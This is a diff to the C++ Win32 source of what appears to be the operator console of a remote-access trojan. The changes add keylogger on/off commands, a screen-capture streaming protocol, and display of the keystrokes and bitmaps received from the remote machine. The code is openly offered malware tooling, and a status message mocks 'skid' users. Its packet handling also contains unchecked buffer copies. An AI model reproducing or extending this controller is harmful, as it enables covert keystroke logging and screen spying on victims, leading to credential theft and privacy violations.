@@ -10,11 +10,22 @@ SOCKET sa;
 stringstream KEYLOG_STREAM;
 char client_buffer[BUFFER_SZ];
 string client_operator, client_operand;
-string keylog = "Keylog window:\nfdf";
+string keylog = "Keylog window:\n";
 
 /*  Make the class name into a global variable  */
 char szClassName[ ] = "KeyClient";
 HWND g_hToolbar = NULL;
+
+        int bitcounter = 0, framesdrawn = 0;
+        bool pkt_complete = false;
+
+
+        unsigned char *bitmapbuf, *bitmapbuf_compressed;
+
+        IMAGE_PKT_HEADER hdrpkt;
+        BITMAPINFOHEADER bi;
+        HDC handle_WindowDC;
+        PAINTSTRUCT paintstruct;
 
 
 int WINAPI WinMain (HINSTANCE hThisInstance,
@@ -25,6 +36,11 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
 
     MESSAGEMAP["KEYLOG"] = KEYLOG;
     MESSAGEMAP["STREAMPICTURE"] = STREAMPICTURE;
+    MESSAGEMAP["BITMAPHDR"] = BITMAPHDR;
+    MESSAGEMAP["BITMAPDATA"] = BITMAPDATA;
+    MESSAGEMAP["BITMAPEND"] = BITMAPEND;
+
+
 
     /*INITIALIZE WINSOCK*/
     WSADATA wsa;
@@ -103,21 +119,23 @@ int WINAPI WinMain (HINSTANCE hThisInstance,
 LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
 
-    switch (message)                  /* handle the messages */
+    switch (message)
     {
-
-
        case WM_CREATE:{
-           HINSTANCE hInstance = GetModuleHandle(NULL);
-            CreateWindowEx(NULL, "BUTTON", "Send DialogBox", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460 , 275, 150, 24, hwnd, (HMENU)MAIN_WINDOW_BUTTONMSG1, hInstance, NULL);
-            CreateWindowEx(NULL, "BUTTON", "Connect To IP: ", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 25, 300, 150, 24, hwnd, (HMENU)CONNECT_TO_HOST, hInstance, NULL);
-            CreateWindowEx(NULL, "EDIT", "IP_ADDRESS", WS_CHILD | WS_VISIBLE | WS_BORDER , 200, 300, 150, 24, hwnd, HMENU(IPADDR_EDIT), hInstance, NULL);
-            CreateWindowEx(NULL, "EDIT", "PORT #", WS_CHILD | WS_VISIBLE | WS_BORDER, 360, 300, 75, 24, hwnd, HMENU(PORTNUMBER_EDIT), hInstance, NULL);
-            CreateWindowEx(NULL, "BUTTON", "Disconnect", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460, 300, 150, 24, hwnd, HMENU(DISCONNECT_HOST), hInstance, NULL);
-            CreateWindowEx(NULL, "STATIC", "Status: Client Initialized! No errors so far!", WS_CHILD|WS_VISIBLE|SS_SUNKEN,25, 330, 585, 18, hwnd, HMENU(STATIC_STATUS_TEXT), hInstance, NULL);
-            CreateWindowEx(NULL, "EDIT", "Keylog Window: ", WS_CHILD|WS_VISIBLE|ES_READONLY|ES_MULTILINE|WS_VSCROLL, 25, 350, 585, 65, hwnd, HMENU(KEYLOG_WINDOW), hInstance, NULL);
-            CreateWindowEx(NULL, "button", "Keylogger On", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 25, 420, 115, 15, hwnd, HMENU(CHK_KEYLOG), hInstance, NULL);
-            CreateWindowEx(NULL, "button", "Keylogger Off", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 145, 420, 120, 15, hwnd, HMENU(UNCHK_KEYLOG), hInstance, NULL);
+
+            HINSTANCE hInstance = GetModuleHandle(NULL);
+            CreateWindowEx(NULL, "BUTTON", "Send DialogBox", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 665, 290, 150, 24, hwnd, (HMENU)MAIN_WINDOW_BUTTONMSG1, hInstance, NULL);
+            CreateWindowEx(NULL, "BUTTON", "Connect To IP: ", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 15, 395, 150, 24, hwnd, (HMENU)CONNECT_TO_HOST, hInstance, NULL);
+            CreateWindowEx(NULL, "EDIT", "127.0.0.1", WS_CHILD | WS_VISIBLE | WS_BORDER , 200, 395, 150, 24, hwnd, HMENU(IPADDR_EDIT), hInstance, NULL);
+            CreateWindowEx(NULL, "EDIT", "80", WS_CHILD | WS_VISIBLE | WS_BORDER, 360, 395, 75, 24, hwnd, HMENU(PORTNUMBER_EDIT), hInstance, NULL);
+            CreateWindowEx(NULL, "BUTTON", "Disconnect Client", WS_TABSTOP|WS_VISIBLE|WS_CHILD|BS_DEFPUSHBUTTON, 460, 395,195, 24, hwnd, HMENU(DISCONNECT_HOST), hInstance, NULL);
+            CreateWindowEx(NULL, "STATIC", "Status: Client Initialized! No errors so far!", WS_CHILD|WS_VISIBLE|SS_SUNKEN,15, 425, 640, 18, hwnd, HMENU(STATIC_STATUS_TEXT), hInstance, NULL);
+            CreateWindowEx(NULL, "EDIT", "Keylog Window: ", WS_CHILD|WS_VISIBLE|ES_READONLY|ES_MULTILINE|WS_VSCROLL, 15, 445, 640, 65, hwnd, HMENU(KEYLOG_WINDOW), hInstance, NULL);
+            CreateWindowEx(NULL, "BUTTON", "Keylogger On", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 15, 515, 115, 15, hwnd, HMENU(CHK_KEYLOG), hInstance, NULL);
+            CreateWindowEx(NULL, "BUTTON", "Keylogger Off", WS_VISIBLE | WS_CHILD | BS_RADIOBUTTON, 145, 515, 120, 15, hwnd, HMENU(UNCHK_KEYLOG), hInstance, NULL);
+            CreateWindowEx(NULL, "BUTTON", "Start Stream", WS_VISIBLE | WS_CHILD, 270, 515, 125, 17, hwnd, HMENU(STREAM_BUTTON), hInstance, NULL);
+            CreateWindowEx(NULL, "STATIC", "Stream: ", WS_CHILD|WS_VISIBLE|SS_SUNKEN, 15, 5, 640, 20, hwnd, HMENU(STREAM_STATUS), hInstance, NULL);
+            CreateWindowEx(NULL, "BUTTON", "Stop Stream", WS_VISIBLE | WS_CHILD, 400, 515, 125, 17, hwnd, HMENU(STOP_STREAM), hInstance, NULL);
         }
         break;
 
@@ -130,13 +148,13 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                      SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Disconnected.");
                 }
                 break;
-                case FD_CONNECT: MessageBox(NULL, "Attempting connection!", "Attempting connection!", MB_OK | MB_ICONINFORMATION);
+                case FD_CONNECT:
+                    //MessageBox(NULL, "Attempting connection!", "Attempting connection!", MB_OK | MB_ICONINFORMATION);
                 break;
-                case FD_WRITE:   SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Command Sent you stupid skid!");
+                case FD_WRITE:
+                    SetDlgItemText(hwnd, STATIC_STATUS_TEXT, "Status: Command Sent you stupid skid!");
                 break;
                 case FD_READ:{
-
-
 
                     //HINT HINT, Since the keylogger feature isnt implemented. Guess what? Implement it here.
                     //Whenever the server gets a read message, parse the message into a operator/operand like the server
@@ -144,9 +162,10 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                     //That way we can differentiate between statuses and Keylogwindow!
                     //You can add other ways in which the server sends messages to client.
                     //This can be a great chat client as well!
-                    client_operator = "", client_operand = "";
 
-                        memset(&client_buffer[0], '\0', BUFFER_SZ);
+                    //client_operator = "", client_operand = "";
+
+                       /* memset(&client_buffer[0], '\0', BUFFER_SZ);
                         HandleError(recv(sa, client_buffer,  BUFFER_SZ, NULL));
 
                          int forcount = 0;
@@ -160,16 +179,76 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                             client_operand += client_buffer[forcount];
                         }
 
-                        map<string, CLIENT_MESSAGES>::iterator i = MESSAGEMAP.find(client_operator);
+                        map<string, CLIENT_MESSAGES>::iterator i = MESSAGEMAP.find(client_operator);*/
 
+                    PKT pkt;
+
+                    recv(sa, (char*)&pkt, sizeof(PKT), 0);
+
+                    client_operator.clear();
+                    client_operand.clear();
+                    client_operator.append(pkt.command);
+
+                    map<string, CLIENT_MESSAGES>::iterator i = MESSAGEMAP.find(client_operator);
 
                         switch(i->second){
 
                             case KEYLOG: {
 
-                                keylog.append(client_operand);
+                                keylog.append(reinterpret_cast<char *>(pkt.data));
                                 //std::cout <<"\n" <<keylog;
                                 SetDlgItemText(hwnd, KEYLOG_WINDOW, keylog.c_str());
+
+                            }
+                            break;
+
+                            case BITMAPHDR:{
+
+
+
+                                hdrpkt = *(IMAGE_PKT_HEADER *)pkt.data;
+
+                                bitmapbuf = new unsigned char[hdrpkt.uncompressed_size];
+                                bitmapbuf_compressed = new unsigned char[hdrpkt.compressed_Size];
+
+                                bi = hdrpkt.bitmaphdr;
+
+                                stringstream ss;
+                                framesdrawn++;
+                                ss << "Stream Original Resolution: " << hdrpkt.origx << ", " << hdrpkt.origy
+                                   << " || Stretched to: 640, 360 || " <<  framesdrawn << " Frames drawn at 10 fps";
+                                SetDlgItemText(hwnd, STREAM_STATUS, ss.str().c_str());
+
+                            }
+
+                            break;
+
+                            case BITMAPDATA:{
+
+
+                                for(int i = 0; i<4096 && bitcounter < hdrpkt.compressed_Size; i++){
+
+                                    bitmapbuf_compressed[bitcounter] = pkt.data[i];
+                                    bitcounter++;
+                                    //std::cout << "\n"<< bitcounter
+                                }
+                            }
+
+                            break;
+
+                            case BITMAPEND:{
+                                //MessageBox(NULL, NULL,
+                                   //        "Bitmapend", NULL);
+                                bitcounter = 0;
+                                pkt_complete = true;
+
+                                //uncompress(newbuff, &dwBmpSize, buff, buffersz);
+                                uncompress(bitmapbuf, &hdrpkt.uncompressed_size, bitmapbuf_compressed, hdrpkt.compressed_Size);
+
+                                RedrawWindow(hwnd, NULL,NULL, RDW_INVALIDATE);
+
+
+
                             }
                             break;
 
@@ -190,25 +269,77 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
         }
 
+        case WM_PAINT:{
+
+            //handle_WindowDC = BeginPaint(hwnd, &paintstruct);
+
+
+
+
+            //EndPaint(hwnd, &paintstruct);
+
+            if (pkt_complete){
+
+                handle_WindowDC = BeginPaint(hwnd, &paintstruct);
+
+                    SetDIBitsToDevice(handle_WindowDC, 15, 30, 640, 360, 0, 0, 0, 360, bitmapbuf, (BITMAPINFO *)&bi, DIB_RGB_COLORS );
+
+                EndPaint(hwnd, &paintstruct);
+                ReleaseDC(hwnd, handle_WindowDC);
+
+                delete[] bitmapbuf;
+                delete[] bitmapbuf_compressed;
+                pkt_complete = false;
+                //MessageBox(NULL, "I am painting", NULL, NULL);
+
+            }else return DefWindowProc (hwnd, message, wParam, lParam);
+        }
+
+        break;
+
         case WM_COMMAND:
 
             switch(LOWORD(wParam)){
                 case CHK_KEYLOG:{
+
+                    //If the button is already checked, then break out.
+                    if (BST_CHECKED == IsDlgButtonChecked(hwnd, CHK_KEYLOG)){
+                        break;
+                    }
                     CheckDlgButton(hwnd, CHK_KEYLOG, BST_CHECKED);
                     CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_UNCHECKED);
-
-                    HandleError(send(sa, "KEYLOG><", 8, 0));
+                    PKT pktkey;
+                    strncpy(pktkey.command, "KEYLOG\0", 7);
+                    HandleError(send(sa, (char *)&pktkey, sizeof(pktkey), 0));
                     //MessageBox(NULL, "Keylog", NULL, NULL);
 
                 }
                 break;
 
+                case STREAM_BUTTON:{
+
+                    PKT pktstream;
+                    strncpy(pktstream.command, "STREAMPICT\0", 11);
+
+
+                    HandleError(send(sa, (char *)&pktstream, sizeof(pktstream), 0));
+
+                }break;
+
                 case UNCHK_KEYLOG:{
+
+                    //If the button is already checked, then break out.
+                    if (BST_CHECKED == IsDlgButtonChecked(hwnd, UNCHK_KEYLOG)){
+                        break;
+                    }
                     CheckDlgButton(hwnd, UNCHK_KEYLOG, BST_CHECKED);
                     CheckDlgButton(hwnd, CHK_KEYLOG, BST_UNCHECKED);
                     //MessageBox(NULL, "stop Keylog", NULL, NULL);
 
-                    HandleError(send(sa, "KEYLOGSTOP><", 13, 0));
+                    //MessageBox(NULL,NULL,NULL,NULL);
+                    PKT pktunkey;
+                    strncpy(pktunkey.command, "STOPKEYLOG\0", 11);
+                    HandleError(send(sa, (char *)&pktunkey, sizeof(pktunkey), 0));
 
                 }
                 break;
@@ -218,7 +349,9 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                 }break;
 
                 case DISCONNECT_HOST:{
-                    HandleError(send(sa, "DISCONNECT><", 11, 0));
+                    PKT pktdc;
+                    strncpy(pktdc.command, "DISCONNECT\0", 11);
+                    HandleError(send(sa, (char *)&pktdc, sizeof(pktdc), 0));
                     Sleep(1000);
                     HandleError(closesocket(sa));
                     MessageBox(NULL, "Disconnected from client!", "Socket Disconnected!", MB_OK | MB_ICONINFORMATION);
@@ -233,24 +366,28 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
                     int iplen = GetWindowTextLength(GetDlgItem(hwnd, IPADDR_EDIT));
                     int portlen = GetWindowTextLength(GetDlgItem(hwnd, PORTNUMBER_EDIT));
 
+                    HandleError(iplen);
+                    HandleError(portlen);
+
                     char* ipbuff = new char[iplen+1];
                     char* portbuff = new char[portlen+1];
 
-                    GetDlgItemText(hwnd, IPADDR_EDIT, ipbuff, iplen + 1);
-                    GetDlgItemText(hwnd, PORTNUMBER_EDIT, portbuff, portlen+1);
+                    HandleError(GetDlgItemText(hwnd, IPADDR_EDIT, ipbuff, iplen + 1));
+                    HandleError(GetDlgItemText(hwnd, PORTNUMBER_EDIT, portbuff, portlen+1));
 
                         string ipaddress(ipbuff);
                         int portnumber = atoi(portbuff);
 
                         sa = socket(AF_INET, SOCK_STREAM, 0);
-                        HandleError(4);
+                        HandleError(sa);
+                        //HandleError(4);
 
 
                         clientsocket.sin_family = AF_INET;
                         clientsocket.sin_addr.s_addr = inet_addr(ipaddress.c_str());
                         clientsocket.sin_port = htons (portnumber);
 
-                        WSAAsyncSelect(sa, hwnd, CLIENTMESSAGE_SYNC, FD_CONNECT|FD_READ|FD_WRITE|FD_CLOSE);
+                        HandleError(WSAAsyncSelect(sa, hwnd, CLIENTMESSAGE_SYNC, FD_CONNECT|FD_READ|FD_WRITE|FD_CLOSE));
 
 
                         if (HandleError(connect(sa, (struct sockaddr *)&clientsocket, sizeof(clientsocket))) == SOCKET_ERROR){
@@ -304,11 +441,8 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
                 case IDM_CONTACT:{
 
-                        int ret = DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_EMAILME),hwnd, EmailMeDlg);
+                         HandleError(DialogBox(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_EMAILME),hwnd, EmailMeDlg));
 
-                    if(ret == -1){
-                        MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION);\
-                    }
 
                 }
                 break;
@@ -319,7 +453,7 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
                     if(ret == -1){
 
-                        MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION);
+                        HandleError(MessageBox(hwnd, "Dialog Failed!", "Error", MB_OK | MB_ICONINFORMATION));
 
                     }
 
@@ -329,7 +463,7 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
 
         break;
         case WM_DESTROY:{
-            WSACleanup();
+            HandleError(WSACleanup());
             PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
 
         }
@@ -340,6 +474,7 @@ LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM
     }
         return 0;
 }
+
 
 
 //http://us.generation-nt.com/answer/getdlgitemfloat-help-26637032.html
@@ -356,15 +491,14 @@ float GetDlgItemFloat(HWND hDlg, int id){
 
 int HandleError(int error){
 
-    if (error == SOCKET_ERROR){
+   if ( error < 0){
 
         stringstream ss;
-        ss <<"Error: " << WSAGetLastError() << " From WSAGetLastError() From WSAStart() !";
+        ss <<"ErrorC: " << WSAGetLastError() << " From WSA/GetLastError()!";
         MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);
 
     }else return 0;
 
-    return SOCKET_ERROR;
+    return 0;
 }
-
 
